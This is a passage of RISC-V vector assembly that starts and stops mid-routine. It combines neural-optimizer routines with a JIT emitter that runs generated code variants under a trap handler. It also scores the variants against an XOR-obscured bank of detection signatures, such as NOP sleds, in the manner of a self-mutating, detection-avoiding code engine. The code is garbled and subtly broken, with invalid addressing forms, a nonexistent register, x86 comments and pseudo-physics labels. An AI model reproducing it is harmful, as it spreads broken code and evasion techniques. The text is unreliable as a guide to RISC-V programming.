    # 1. Decompose: x = m * 2^e
    vsrl.vi     v1, v0, 23
    vandi.vi    v1, v1, 0xFF
    vsub.vi     v1, v1, 127     # v1 = exponent (integer)
    vfcvt.f.x.v v1, v1          # v1 = float(e)

    li          t1, 0x7FFFFF
    vand.vx     v2, v0, t1
    li          t1, 0x3F800000
    vor.vx      v2, v2, t1      # v2 = mantissa in [1, 2)

    # 2. Horner's Method for ln(m)
    # Target: C6*m^6 + ... + C0
    la      t1, vlog_coeffs
    flw     ft0, 24(t1)         # Load C6
    vfmv.v.f v3, ft0
    
    li      t2, 20              # Pointer offset for C5 down to C0
@@horner_loop:
    flw       ft0, 0(t1, t2)      # Load next coefficient
    vfmacc.vf v3, ft0, v2         # v3 = (v3 * v2) + ft0
    addi      t2, t2, -4
    bgez      t2, @horner_loop

# a0 = v_config pointer
# a0 = v_config pointer
apply_swa_averaging_rvv:
    # --- Step 1: Prologue (Save Callee-Saved Registers) ---
    addi sp, sp, -32          # Increased space for alignment/safety
    sd   s0, 24(sp)           # Use sd for 64-bit pointers
    sd   s1, 16(sp)
    sd   s2, 8(sp)

    # --- Step 2: Load Configuration ---
    # Using 'ld' assuming RV64 pointers for the buffers
    ld   s0, 0(a0)            # s0 = MHA_Weights_Ptr (Source)
    ld   s1, 8(a0)            # s1 = SWA_Weights_Ptr (Destination/Avg)
    ld   s2, 16(a0)           # s2 = Total_Params (Element count)
    
    # Load Scalars
    la   t1, swa_alpha
    flw  ft0, 0(t1)           # ft0 = alpha (e.g., 0.99)
    la   t1, swa_inv_alpha
    flw  ft1, 0(t1)           # ft1 = 1 - alpha (e.g., 0.01)

@swa_loop:
    # --- Step 3: Vectorized Work ---
    # Set vector length for e32 (32-bit floats)
    vsetvli t0, s2, e32, m1, ta, ma
    
    vle32.v v0, (s1)          # Load existing Average
    vle32.v v1, (s0)          # Load new MHA Weights
    
    # Avg = (Avg * alpha) + (New * inv_alpha)
    vfmul.vf v0, v0, ft0      # v0 = Avg * alpha
    vfmacc.vf v0, ft1, v1     # v0 = (New * inv_alpha) + v0
    
    vse32.v v0, (s1)          # Store updated Average back

    # --- Step 4: Pointer & Counter Updates ---
    slli t1, t0, 2            # t1 = elements processed * 4 bytes
    add  s0, s0, t1           # Move source pointer
    add  s1, s1, t1           # Move dest pointer
    sub  s2, s2, t0           # Decrement remaining count
    bnez s2, @swa_loop        # Repeat if elements remain

    # --- Step 5: Epilogue (Restore and Return) ---
    ld   s0, 24(sp)
    ld   s1, 16(sp)
    ld   s2, 8(sp)
    addi sp, sp, 32
    ret

# ==============================================================================
# select_neural_instruction (Stochastic Sweep)
# a0 = v_config pointer
# Output: a0 = Selected Index (0-95)
# ==============================================================================
select_neural_instruction:
    # 1. Generate Random Float [0.0, 1.0] correctly
    csrr    t0, cycle             # Get raw entropy
    li      t1, 0x7FFFFF          # Mantissa mask
    and     t0, t0, t1            # Keep 23 bits
    li      t1, 0x3F800000        # IEEE-754 for 1.0
    or      t0, t0, t1            # Construct 1.x float
    fmv.w.x ft0, t0               
    li      t1, 0x3F800000
    fmv.w.x ft1, t1
    fsub.s  ft0, ft0, ft1         # ft0 = target_threshold (0.0 to 1.0)

    # 2. Setup Sweep
    lw      t1, probability_buffer_ptr(a0) # Use pointer from config
    li      t2, 0                 # Index counter
    fcvt.s.w ft1, zero            # Cumulative sum = 0.0

_sweep_loop:
    flw     ft2, 0(t1)            # Load P(i)
    fadd.s  ft1, ft1, ft2         # cumulative += P(i)
    
    # 3. Check if we passed the threshold
    flt.s   t3, ft0, ft1          # if (threshold < cumulative) t3 = 1
    bnez    t3, _found_index
    
    # 4. Loop Maintenance
    addi    t1, t1, 4             # Next float in buffer
    addi    t2, t2, 1             # Increment index
    li      t4, 95                # Total opcodes - 1
    blt     t2, t4, _sweep_loop

_found_index:
    mv      a0, t2                # Return index (0-95)
    ret

# a0 = v_config pointer
# a1 = new_reg_index (the register the AI just used)
compute_complexity_bonus_rvv:
    # --- Stage 1: Sliding Window Shift ---
    lw      t0, v_config_last_reg(a0)       # load n-1
    sw      t0, v_config_last_reg_m2(a0)    # n-1 -> n-2
    lw      t1, v_config_curr_reg(a0)       # load n
    sw      t1, v_config_last_reg(a0)       # n -> n-1
    sw      a1, v_config_curr_reg(a0)       # update current with a1

    # Initialize scoring (fa2 = penalty, fa3 = reward)
    fcvt.s.w fa2, zero
    fcvt.s.w fa3, zero

    # --- Stage 2: Dead-code vs. Dependency Chain ---
    # a1 = current, t1 = last
    bne     a1, t1, _reset_chain            # if reg switched, chain broke
    
    lbu     t2, v_config_last_instr_flags(a0)
    andi    t2, t2, 0x01                    # flag_destructive bit
    bnez    t2, _dead_code_detected

    # Dependency Chain Reward
    lw      t3, v_config_chain_counter(a0)
    addi    t3, t3, 1
    sw      t3, v_config_chain_counter(a0)
    li      t4, 3
    blt     t3, t4, _check_ping_pong
    la      t5, const_chain_reward
    flw     ft0, 0(t5)
    fadd.s  fa3, fa3, ft0                   # Reward logic depth
    j       _check_ping_pong

_dead_code_detected:
    la      t5, const_dead_code_penalty
    flw     ft0, 0(t5)
    fadd.s  fa2, fa2, ft0                   # Penalty for overwriting
    sw      zero, v_config_chain_counter(a0)
    j       _check_ping_pong

_reset_chain:
    sw      zero, v_config_chain_counter(a0)

    # --- Stage 3: Temporal Patterns ---
_check_ping_pong:
    lw      t0, v_config_last_reg_m2(a0)
    bne     a1, t0, _check_opcode           # current == n-2?
    la      t5, const_ping_pong_penalty
    flw     ft0, 0(t5)
    fadd.s  fa2, fa2, ft0

_check_opcode:
    lw      t0, v_config_curr_opcode(a0)
    lw      t1, v_config_last_opcode(a0)
    bne     t0, t1, _scan_signatures
    la      t5, const_redundancy_penalty
    flw     ft0, 0(t5)
    fadd.s  fa2, fa2, ft0

    # --- Stage 4: Signature Scanning ---
    # Simplified logic: Iterates through signature bank
_scan_signatures:
    la      s1, sig_nop_sled                # ESI equivalent
    li      s2, 2                           # Loop counter
_sig_loop:
    lw      t0, v_config_write_ptr(a0)
    lw      t1, sig_entry_len(s1)
    sub     t0, t0, t1                      # Backtrack pointer (EDI)
    
    li      t2, 0                           # Index (ECX)
_pattern_match:
    add     t3, t0, t2
    lbu     t3, 0(t3)                       # al = [edi + ecx]
    addi    t4, s1, sig_entry_mask
    add     t4, t4, t2
    lbu     t4, 0(t4)                       # dl = [mask + ecx]
    and     t3, t3, t4
    
    addi    t5, s1, sig_entry_pattern
    add     t5, t5, t2
    lbu     t5, 0(t5)
    bne     t3, t5, _next_signature
    
    addi    t2, t2, 1
    lw      t6, sig_entry_len(s1)
    blt     t2, t6, _pattern_match
    
    # Match!
    flw     ft0, sig_entry_threat(s1)
    fadd.s  fa2, fa2, ft0

_next_signature:
    addi    s1, s1, 32                      # sizeof(signature_entry)
    addi    s2, s2, -1
    bnez    s2, _sig_loop

    # --- Stage 5: Diversity & Integration ---
    lw      t0, v_config_unique_reg_count(a0)
    fcvt.s.w ft0, t0
    la      t1, w_complexity_bonus
    flw     ft1, 0(t1)
    fmadd.s fa3, ft0, ft1, fa3              # Reward * count + existing bonus

    # Hardware Clash check
    lbu     t0, v_config_hw_fault(a0)
    li      t1, 1
    bne     t0, t1, _finalize_loss
    la      t2, const_hw_clash_penalty
    flw     ft0, 0(t2)
    fadd.s  fa2, fa2, ft0
    sb      zero, v_config_hw_fault(a0)

_finalize_loss:
    flw     ft1, v_config_curr_loss(a0)
    fadd.s  ft1, ft1, fa2                   # + penalties
    fsub.s  ft1, ft1, fa3                   # - bonuses
    
    # Survival Clamp (maxss equivalent)
    la      t0, const_min_loss
    flw     ft2, 0(t0)
    fmax.s  ft1, ft1, ft2
    
    fsw     ft1, v_config_curr_loss(a0)
    ret

# a0 = v_config pointer
# a0 = v_config pointer
Execute_Variant_Safely_Embedded:
    # 1. Save current trap handler
    csrr    t0, mtvec
    sw      t0, v_config_saved_mtvec(a0)
    
    # 2. Set trap handler to our local Recovery Label
    la      t1, Trap_Recovery_Handler
    csrw    mtvec, t1
    
    # 3. Save Stack Pointer for longjmp-style recovery
    sw      sp, v_config_saved_esp(a0)

    # 4. Jump to JIT Code
    lw      t2, v_config_execute_ptr(a0)
    jalr    ra, t2

    # 5. Normal Exit: Restore original trap handler
    lw      t0, v_config_saved_mtvec(a0)
    csrw    mtvec, t0
    sw      zero, v_config_integrity_failure(a0)
    ret

Trap_Recovery_Handler:
    # We land here on Illegal Instruction, Load/Store Alignment fault, etc.
    # a0 usually stays preserved in embedded JITs, or use a global pointer
    la      a0, my_config_instance_ptr
    lw      a0, 0(a0)
    
    li      t0, 1
    sw      t0, v_config_integrity_failure(a0)
    
    # Restore SP and original Trap Handler
    lw      sp, v_config_saved_esp(a0)
    lw      t1, v_config_saved_mtvec(a0)
    csrw    mtvec, t1
    
    # Return to the caller of Execute_Variant_Safely
    ret

# Input:  v0 = Vector of 16 probabilities (p0, p1, ... p15)
# Output: a0 = Selected opcode index (0-15)

sample_opcode_from_distribution_rvv:
    # --- STEP 1: GENERATE TARGET ROLL [0.0, 1.0] ---
    # Using the 'cycle' CSR as a high-speed entropy source
    csrr    t0, cycle
    li      t1, 0x7FFFFF
    and     t0, t0, t1              # Mask mantissa
    li      t1, 0x3F800000
    or      t0, t0, t1              # Form float 1.x
    fmv.w.x ft0, t0
    li      t1, 0x3F800000
    fmv.w.x ft1, t1
    fsub.s  ft0, ft0, ft1           # ft0 = Roll [0.0, 1.0]

    # --- STEP 2: GENERATE CDF (Prefix Sum) ---
    # v0 contains [p0, p1, ... p15]
    vsetivli zero, 16, e32, m1, ta, ma
    
    # RVV does not have a single-cycle 'vscan' for floats in all specs, 
    # so we use a standard vector prefix sum pattern.
    # We move probabilities to v1 to preserve v0.
    vmv.v.v v1, v0
    
    # Simple recursive doubling (Prefix Sum)
    vslideup.vi v2, v1, 1           # v2 = [0, p0, p1...]
    vfadd.vv    v1, v1, v2          # p_i = p_i + p_{i-1}
    vslideup.vi v2, v1, 2
    vfadd.vv    v1, v1, v2          # p_i = sum(i...i-2)
    vslideup.vi v2, v1, 4
    vfadd.vv    v1, v1, v2
    vslideup.vi v2, v1, 8
    vfadd.vv    v1, v1, v2          # v1 now contains the CDF
    
    # --- STEP 3: COMPARISON ---
    # Check which CDF values are less than our Target Roll (ft0)
    # vmslt.vf creates a bitmask in v0 where v1[i] < ft0
    vmslt.vf v0, v1, ft0

    # --- STEP 4: INDEX SELECTION ---
    # The number of set bits in the mask corresponds to the index 
    # of the first element that exceeded the roll.
    # (e.g., if Roll is 0.5 and CDF is [0.1, 0.4, 0.7...], mask is [1, 1, 0...])
    # Population count of the mask = 2 = Index 2 selected.
    vmpopc.m a0, v0
    
    ret

# ==============================================================================
# RISC-V 64-bit (RV64GC) ULTRA-JIT EMITTER
# 100% Complete Implementation - Fixed Logical Flow
# ==============================================================================

emit_riscv_instruction:
    # --- PROLOGUE ---
    addi    sp, sp, -80
    sd      ra, 72(sp)
    sd      s1, 64(sp)                  # v_config pointer (a0)
    sd      s2, 56(sp)                  # Current JIT Buffer Pointer
    sd      s3, 48(sp)                  # Metadata Entry
    sd      s4, 40(sp)                  # Instruction Template
    
    mv      s1, a0                      # Preserve v_config pointer

    # *** 1. METADATA LOOKUP ***
    # Offset 104 in v_config is opcode_table_ptr (from your massive struct)
    ld      t1, 104(s1)                 
    slli    t2, a1, 3                   # Use a1 for index, Index * 8
    add     t1, t1, t2
    ld      s3, 0(t1)                   # Fetch Template + Type + Leaf

    # *** 2. DESTINATION PREP ***
    # Offset 32 is output_code_buffer, Offset 68 is current_size
    ld      t1, 32(s1)                  
    lw      t2, 68(s1)                  # Use 'lw' for current_size (dd)
    add     s2, t1, t2                  # s2 = Target Write Address

    # *** 3. DISPATCHER & TYPE DECODER ***
    mv      s4, s3                      # s4 = Lower 32-bits (Template)
    srli    t3, s3, 32                  # t3 = Type ID
    andi    t3, t3, 0xFF
    srli    t6, s3, 40                  # t6 = Leaf/Scale/Immediate
    andi    t6, t6, 0xFF

    # --- TYPE 9: RISC-V SYNTHETIC SIB ---
    li      t0, 9
    bne     t3, t0, _check_4
    # Offset 116 is target_register_focus (rd/rs1 index)
    lw      t4, 116(s1)                 
    andi    t4, t4, 0x1F
    
    # Write SLLI: Shift index register
    li      t5, 0x00001293              # Template: SLLI t0, rs1, imm
    slli    t1, t4, 15                  # Shift RS1 into place
    slli    t2, t6, 20                  # Shift Scale into place
    or      t5, t5, t1
    or      t5, t5, t2
    sw      t5, 0(s2)
    
    # Write ADD: Add base to shifted index
    # We'll use t0 (x5) as the intermediary
    li      t5, 0x005282b3              # ADD t0, t0, t1
    sw      t5, 4(s2)
    li      t0, 8
    j       _update_size

_check_4: # TYPE 4: BRANCH SHUFFLER (B-Type Encoding)
    li      t0, 4
    bne     t3, t0, _check_13
    # Offset 368 is v_Safe_Reentry_Point (Absolute Target)
    ld      t4, 368(s1)                 
    sub     t4, t4, s2                  # PC-Relative Delta
    
    # RISC-V B-Type Immediate Scrambling (The 12-bit mess)
    # [31] imm[12] | [25:30] imm[10:5] | [8:11] imm[4:1] | [7] imm[11]
    srli    t0, t4, 12; andi t0, t0, 1;   slli t0, t0, 31 
    srli    t1, t4, 11; andi t1, t1, 1;   slli t1, t1, 7  
    srli    t2, t4, 1;  andi t2, t2, 0xF; slli t2, t2, 8 
    srli    t3, t4, 5;  andi t3, t3, 0x3F; slli t3, t3, 25 
    
    or      s4, s4, t0
    or      s4, s4, t1
    or      s4, s4, t2
    or      s4, s4, t3
    j       _write_32

_check_13: # TYPE 13: FENCE.I (Standard Pipeline Flush)
    li      t0, 13
    bne     t3, t0, _check_14
    fence   rw, rw
    fence.i
    sw      s4, 0(s2)                   # Write the FENCE.I instruction
    li      t0, 4
    j       _update_size

_check_14: # TYPE 14: RVC (16-bit Compressed)
    li      t0, 14
    bne     t3, t0, _check_15
    sh      s4, 0(s2)
    li      t0, 2
    j       _update_size

_check_15: # TYPE 15: 64-BIT IMM MATERIALIZATION
    li      t0, 15
    bne     t3, t0, _patch_rd
    # Offset 376 is v_Last_Verified_Seed (Used as 64-bit constant)
    ld      t4, 376(s1)                 
    sd      t4, 0(s2)
    li      t0, 8
    j       _update_size

_patch_rd: # STANDARD REGISTER PATCH (R/I-Type)
    lw      t4, 116(s1)                 # Get Focus Reg
    andi    t4, t4, 0x1F
    slli    t4, t4, 7                   # Move to 'rd' field
    li      t5, 0xFFFFF07F              # Mask to clear existing rd
    and     s4, s4, t5
    or      s4, s4, t4
    # Fall through to write_32

_write_32:
    sw      s4, 0(s2)
    li      t0, 4

_update_size:
    lw      t2, 68(s1)                  # current_size
    add     t2, t2, t0
    sw      t2, 68(s1)

_exit:
    ld      s4, 40(sp)
    ld      s3, 48(sp)
    ld      s2, 56(sp)
    ld      s1, 64(sp)
    ld      ra, 72(sp)
    addi    sp, sp, 80
    ret

# Constants assumed to be in a data section or pool
# ft0-ft11 are temporary floating point registers

calculate_transformer_loss:
    addi    sp, sp, -64
    sd      ra, 56(sp)
    sd      s0, 48(sp)
    fsd     fs0, 40(sp)
    fsd     fs1, 32(sp)

    # 1. Interleaved Metric Fetch & Weight Loading
    flw     ft1, 0(a0)            # Latency
    la      t0, weights_pool      
    flw     ft2, 4(a0)            # Entropy
    flw     ft5, 0(t0)            # w_latency
    flw     ft3, 8(a0)            # Integrity
    flw     ft6, 4(t0)            # w_integrity
    flw     ft4, 12(a0)           # Cost
    flw     ft7, 8(t0)            # w_cost
    flw     ft8, 12(t0)           # w_entropy

    # 2. Pipelined Weighted Base Loss
    fmul.s  ft1, ft1, ft5         # Latency * w_l
    fmul.s  ft3, ft3, ft6         # Integrity * w_i
    fmul.s  ft4, ft4, ft7         # Cost * w_c
    fmul.s  ft2, ft2, ft8         # Entropy * w_e

    fadd.s  ft1, ft1, ft3         # sum1
    fadd.s  ft4, ft4, ft1         # sum2
    fsub.s  ft1, ft4, ft2         # ft1 = raw_loss

    # 3. Dead Man's Switch (Identity Veil)
    lw      t1, 16(a0)            
    beqz    t1, _skip_sig_scan

    fmv.s   fs0, ft1
    ld      a1, 24(a0)            
    lw      a2, 32(a0)            
    jal     ra, check_for_signatures
    fadd.s  ft1, fs0, fa0         # Base + Penalty
    j       _huber_entry

_skip_sig_scan:
    nop

_huber_entry:
    # 4. Huber Loss (Stability Control)
    la      t0, huber_constants
    flw     ft9, 0(t0)            # delta
    flw     ft10, 4(t0)           # 0.5 * delta
    flw     ft11, 8(t0)           # 0.5 constant

    # FIX: fabs.s must store in a float register, not t2
    fabs.s  ft2, ft1              # ft2 = |error|
    flt.s   t3, ft2, ft9          # Is |error| < delta?
    bnez    t3, _huber_small

    # Large Error Path: delta * (|error| - 0.5 * delta)
    # ft2 is |error|
    fsub.s  ft1, ft2, ft10        # |error| - 0.5 * delta
    fmul.s  ft1, ft1, ft9         # Result
    j       _finalize

_huber_small:
    # Small Error Path: 0.5 * error^2
    fmul.s  ft1, ft1, ft1         # ft1 = error^2
    fmul.s  ft1, ft1, ft11        # ft1 = 0.5 * error^2
    # Removed the fmadd.s that was causing error^4

_finalize:
    # 5. Non-Negative Clamping
    # fmin.s/fmax.s can use fzero pseudo-register directly
    fmax.s  ft1, ft1, fzero
    fsw     ft1, 36(a0)           

    # Epilogue
    ld      ra, 56(sp)
    ld      s0, 48(sp)
    fld     fs0, 40(sp)
    fld     fs1, 32(sp)
    addi    sp, sp, 64
    ret

backprop_mha_weights:
    # Load metadata
    ld      t0, 40(a0)            # input_data_buffer
    ld      t1, 48(a0)            # mha_gradients_ptr
    ld      t2, 56(a0)            # mha_weights_ptr
    lw      a1, 64(a0)            # weight_count
    
    # Load scalar hyperparameters
    flw     fa0, 36(a0)           # current_loss
    la      t3, hyperparams
    flw     fa1, 0(t3)            # lambda
    flw     fa2, 4(t3)            # clip_max
    flw     fa3, 8(t3)            # clip_min

    li      t5, 0x318             # Mask for NaN/Inf

grad_loop:
    vsetvli t4, a1, e32, m1, ta, ma 
    
    vle32.v  v1, (t0)             
    vle32.v  v2, (t2)             

    # Identify valid floats (Safety Guard) 
    vfclass.v v3, v1
    vand.vx   v3, v3, t5          
    vmsne.vi  v0, v3, 0           # v0 = 1 for BAD
    vmnot.m   v0, v0              # v0 = 1 for GOOD

    # Compute Gradient: grad = (feature * error) + (weight * decay)
    # Corrected vfmacc.vf usage: vd = (f * vs2) + vd
    vfmul.vf  v4, v1, fa0, v0.t   # v4 = feature * error
    vfmacc.vf v4, fa1, v2, v0.t   # v4 += decay * weight

    # Clip Gradients
    vfmax.vf  v4, v4, fa3, v0.t   # Clip Min
    vfmin.vf  v4, v4, fa2, v0.t   # Clip Max

    # Store result and update pointers
    vse32.v   v4, (t1)
    
    slli    t6, t4, 2             
    add     t0, t0, t6            
    add     t1, t1, t6            
    add     t2, t2, t6            
    sub     a1, a1, t4            
    bnez    a1, grad_loop

    ret

# ==============================================================================
# update_adam_v_buffer (RISC-V RV64GV)
# a0 = v_config pointer (s1)
# ==============================================================================
update_adam_v_buffer:
    # --- PROLOGUE: Save Callee-Saved Registers ---
    addi    sp, sp, -64
    sd      ra, 56(sp)
    sd      s2, 48(sp)
    sd      s3, 40(sp)
    sd      s4, 32(sp)
    fsd     fs0, 24(sp)
    fsd     fs1, 16(sp)
    fsd     fs2, 8(sp)

    # --- 1. THERMAL SCALING & NORMALIZATION ---
    lw      t0, v_current_duty(a0)      # Load Duty Cycle
    fcvt.s.w fa0, t0                    
    
    la      t1, f_duty_norm_const
    flw     fa1, 0(t1)                  # 0.00003
    fmul.s  fa0, fa0, fa1               # Normalized Duty

    li      t2, 0x3c23d70a              # 0.01 float
    fmv.w.x ft0, t2
    li      t3, 0x3f800000              # 1.0 float
    fmv.w.x ft1, t3
    
    fmadd.s ft2, fa0, ft0, ft1          # ft2 = (Duty * 0.01) + 1.0
    fdiv.s  fa2, ft1, ft2               # fa2 = Gamma

    # --- 2. LOAD DATA POINTERS ---
    ld      s2, gradients_ptr(a0)
    ld      s3, adam_v_buffer_ptr(a0)
    lw      s4, adam_total_params(a0)
    
    la      t4, beta2
    flw     fs0, 0(t4)
    la      t5, one_minus_beta2
    flw     fs1, 0(t5)
    fmul.s  fs1, fs1, fa2               # Scaled_Decay
    la      t6, relativistic_c_squared
    flw     fs2, 0(t6)

# --- 3. VECTOR UPDATE LOOP ---
v_update_loop:
    vsetvli t0, s4, e32, m4, ta, ma     
    vle32.v v4, (s2)                    # Load Gradients (G)
    vle32.v v8, (s3)                    # Load Velocity (V)

    vfmul.vv v12, v4, v4                # G_sq = G * G
    vfmin.vf v12, v12, fs2              # Relativistic Clip
    
    vfmul.vf v8, v8, fs0                # V = V * beta2
    vfmacc.vf v8, fs1, v12              # V = V + (G_sq * Scaled_Decay)

    vse32.v v8, (s3)                    
    
    slli    t1, t0, 2
    add     s2, s2, t1
    add     s3, s3, t1
    sub     s4, s4, t0
    bnez    s4, v_update_loop

    # --- EPILOGUE ---
    ld      s4, 32(sp)
    ld      s3, 40(sp)
    ld      s2, 48(sp)
    ld      ra, 56(sp)
    addi    sp, sp, 64
    ret

# ==============================================================================
# Execute_Relativistic_Time_Dilation_Kernel
# Formula: Gamma = 1 / sqrt(1 - (V / C^2))
# ==============================================================================
# Formula: Gamma = 1 / sqrt(1 - (V / C^2))
Execute_Relativistic_Time_Dilation_Kernel:
    addi    sp, sp, -64
    sd      ra, 56(sp)
    sd      s2, 48(sp)
    sd      s3, 40(sp)
    sd      s4, 32(sp)

    ld      s2, adam_v_buffer_ptr(a0)
    ld      s3, relativistic_scale(a0)
    lw      s4, mha_weights_count(a0)
    
    flw     fa0, telemetry_latency(a0)  # Environmental Gamma

    # Constants
    li      t0, 0x3f800000              # 1.0
    fmv.w.x fs0, t0
    la      t1, const_c_sq_inv
    flw     fs1, 0(t1)                  # 1/C^2
    la      t2, const_epsilon_cap
    flw     fs2, 0(t2)                  # 0.9999 cap

dilation_loop:
    vsetvli t0, s4, e32, m4, ta, ma
    vle32.v v0, (s2)                    # Load Velocity (V)

    vfmul.vf v4, v0, fs1                # V / C^2
    vfmin.vf v4, v4, fs2                # Event Horizon Clip
    
    vfrsub.vf v8, v4, fs0               # v8 = 1.0 - (V/C^2)
    vfsqrt.v  v8, v8                    # v8 = sqrt(1 - V/C^2)
    
    # FIX: vfrdiv.vf vd, vs2, f -> vd = f / vs2
    vfrdiv.vf v12, v8, fs0              # v12 = 1.0 / v8 [The Lorentz Factor]

    vfmul.vf v12, v12, fa0              # Global Coupling

    vse32.v v12, (s3)                   

    slli    t1, t0, 2
    add     s2, s2, t1
    add     s3, s3, t1
    sub     s4, s4, t0
    bnez    s4, dilation_loop

    fence   rw, rw                      # Explicit Memory Synchronization

    ld      s4, 32(sp)
    ld      s3, 40(sp)
    ld      s2, 48(sp)
    ld      ra, 56(sp)
    addi    sp, sp, 64
    ret

apply_adam_optimization_rvv:
    # 1. STACK PROLOGUE (Ensuring 16-byte alignment)
    addi    sp, sp, -80          # Increased to handle more s-registers safely
    sd      ra, 72(sp)
    sd      s1, 64(sp)
    sd      s2, 56(sp)
    sd      s3, 48(sp)
    sd      s4, 40(sp)
    sd      s5, 32(sp)
    sd      s6, 24(sp)
    sd      s7, 16(sp)
    fsd     fs1, 8(sp)
    fsd     fs2, 0(sp)

    # --- 0. GUARD ---
    # a0 is the v_config pointer. 
    # v_identity_veil is at a specific offset (assuming 16 from your load)
    ld      t0, 16(a0)            # v_identity_veil offset
    beqz    t0, _exit_stasis_early 

    # --- 1. HYPERPARAMETER LOAD ---
    la      t6, adam_learning_rate
    flw     fa4, 0(t6)                
    la      t6, adam_epsilon
    flw     fa5, 0(t6)                
    la      t6, adam_one_minus_beta1
    flw     fs1, 0(t6)                
    la      t6, adam_one_minus_beta2
    flw     fs2, 0(t6)                
    la      t6, consensus_alpha
    flw     fa7, 0(t6)   

    # Newton-Raphson Constants
    li      t6, 0x3f000000           # 0.5
    fmv.w.x ft0, t6
    li      t6, 0x3fc00000           # 1.5
    fmv.w.x ft1, t6

# --- 2. DATA POINTER LOAD (From a1: The Neural Hook) ---
_init_pointers:
    ld      s1, 0(a1)        # mha_weights_ptr
    ld      s2, 8(a1)        # mha_grads_ptr
    ld      s3, 16(a1)       # adam_m_ptr
    ld      s4, 24(a1)       # adam_v_ptr
    ld      s5, 32(a1)       # pulse_ptr (Swarm data - FIXED OFFSET)
    ld      s6, 40(a1)       # relativistic_scale
    lw      s7, 48(a1)       # weights_count

_adam_loop:
    vsetvli t0, s7, e32, m4, ta, ma

    # --- FETCH ---
    vle32.v v4, (s1)                 # W (Weights)
    vle32.v v8, (s2)                 # G (Gradients)
    vle32.v v12, (s3)                # M (Momentum)
    vle32.v v16, (s4)                # V (Velocity)
    vle32.v v20, (s5)                # Pulse (Swarm Injection)

    # --- SWARM DEFENSE ---
    # If Pulse is not NaN/Zero, blend it with Gradient
    vmfeq.vv v0, v20, v20            # Check for non-NaN
    vpopc.m  t5, v0
    beqz     t5, _skip_injection

    vfsub.vv  v24, v20, v4           # (Pulse - W)
    vfmacc.vf v8, fa7, v24           # G = G + Alpha * (Pulse - W)

_skip_injection:
    # --- ADAM MOMENTS ---
    # M = M + (1-Beta1) * (G - M)
    vfsub.vv  v24, v8, v12
    vfmacc.vf v12, fs1, v24          

    # V = V + (1-Beta2) * (G^2 - V)
    vfmul.vv  v28, v8, v8            # G^2
    vfsub.vv  v28, v28, v16
    vfmacc.vf v16, fs2, v28          

    # --- ADJ LR ---
    vle32.v   v24, (s6)              # Relativistic Gamma
    vfmul.vf  v24, v24, fa4          # Gamma * LearningRate
    # v12 is now effectively the numerator

    # --- HIGH-PRECISION RSQRT (Newton-Raphson) ---
    vfadd.vf   v28, v16, fa5         # x = V + epsilon
    vfrsqrt7.v v0, v28               # y = initial estimate
    
    # Refinement: y = y * (1.5 - (0.5 * x * y^2))
    vfmul.vv   v4, v0, v0            # y^2
    vfmul.vv   v4, v4, v28           # x * y^2
    vfmv.v.f   v8, ft1               # Load 1.5
    vfnmsac.vf v8, ft0, v4           # 1.5 - (0.5 * v4)
    vfmul.vv   v0, v0, v8            # Refined rsqrt in v0
    
    # --- FINAL UPDATE ---
    # W = W - (AdjustedLR * M * RefinedRSQRT)
    vfmul.vv   v24, v24, v0          # (AdjLR * rsqrt)
    vfnmsac.vv v4, v24, v12          # W = W - (v24 * M)

    # --- STORE & STRIDE ---
    vse32.v   v4, (s1)
    vse32.v   v12, (s3)
    vse32.v   v16, (s4)

    slli    t1, t0, 2
    add     s1, s1, t1
    add     s2, s2, t1
    add     s3, s3, t1
    add     s4, s4, t1
    add     s5, s5, t1
    add     s6, s6, t1
    
    sub     s7, s7, t0
    bnez    s7, _adam_loop

_exit_stasis_early:
    ld      ra, 72(sp)
    ld      s1, 64(sp)
    ld      s2, 56(sp)
    ld      s3, 48(sp)
    ld      s4, 40(sp)
    ld      s5, 32(sp)
    ld      s6, 24(sp)
    ld      s7, 16(sp)
    fld     fs1, 8(sp)
    fld     fs2, 0(sp)
    addi    sp, sp, 80
    ret

# ==============================================================================
# inject_neural_noise
# a0 = v_config pointer (s1)
# ==============================================================================
inject_neural_noise:
    addi    sp, sp, -64
    sd      ra, 56(sp)
    sd      s2, 48(sp)
    sd      s3, 40(sp)

    # --- PART 1: IDENTITY VEIL (Hardware Entropy) ---
    rdcycle a1                          # Timing-based jitter key
    sw      a1, v_identity_veil(a0)     # Save Veil to config

    # 1. Blur the Predator Bank
    la      t0, predator_identity_bank
    vsetvli t1, x0, e32, m4, ta, ma     
    vle32.v v4, (t0)                    # Load Bank into v4-v7
    
    vmv.v.x v8, a1                      # Broadcast key to v8-v11
    vxor.vv v4, v4, v8                  # Veil the patterns
    vse32.v v4, (t0)                    # Store blurred bank

    # --- PART 2: NEURAL WEIGHT JITTER ---
    li      t2, 0x3DCCCCCD              # 0.1f constant
    fmv.w.x ft0, t2
    
    ld      s2, attention_weights_ptr(a0)
    lw      s3, total_weight_blocks(a0)

noise_loop:
    vsetvli t0, s3, e32, m4, ta, ma
    vle32.v v4, (s2)                    # Load weights into v4-v7
    
    # Generate pseudo-random bitmask using cycle LSBs
    rdcycle t1
    vmsne.vx v0, v4, t1                 # v0 = Mask (1 where weight != cycle_low)
    
    # Inject floating-point jitter (Masked Addition)
    # v4 = v4 + 0.1 where v0 is 1
    vfadd.vf v4, v4, ft0, v0.t          
    
    vse32.v v4, (s2)                    
    slli    t1, t0, 2
    add     s2, s2, t1                  
    sub     s3, s3, t0                  
    bnez    s3, noise_loop

    ld      s3, 40(sp)
    ld      s2, 48(sp)
    ld      ra, 56(sp)
    addi    sp, sp, 64
    ret

# ==============================================================================
# check_for_signatures
# a0 = v_config (s1)
# Output: fa0 = Penalty Score (0.0 clean, 10.0 detected)
# ==============================================================================
check_for_signatures:
    addi    sp, sp, -96
    sd      ra, 88(sp)
    sd      s2, 80(sp)
    sd      s3, 72(sp)

    # --- 1. DE-NOISE THE PATTERN BANK ---
    la      t0, predator_identity_bank
    vsetvli t1, x0, e32, m4, ta, ma
    vle32.v v4, (t0)                    # Load blurred bank (v4-v7)
    lw      t2, v_identity_veil(a0)
    vmv.v.x v8, t2                      # Broadcast key (v8-v11)
    vxor.vv v12, v4, v8                 # v12 = Decrypted patterns

    vmv.x.s t3, v12                     # Extract Slot 0 (NOP Pattern)
    
    # --- 2. SIGNATURE SCAN ---
    ld      s2, write_pointer(a0)
    lw      s3, last_variant_size(a0)
    srli    s3, s3, 2                   # Size in 32-bit words

scan_loop:
    vsetvli t0, s3, e32, m4, ta, ma
    vle32.v v16, (s2)                   # v16-v19 = Variant Code
    
    vmfeq.vx v0, v16, t3                # Compare against NOP
    vpopc.m  t4, v0                     
    bnez     t4, found_threat

    slli     t1, t0, 2
    add      s2, s2, t1
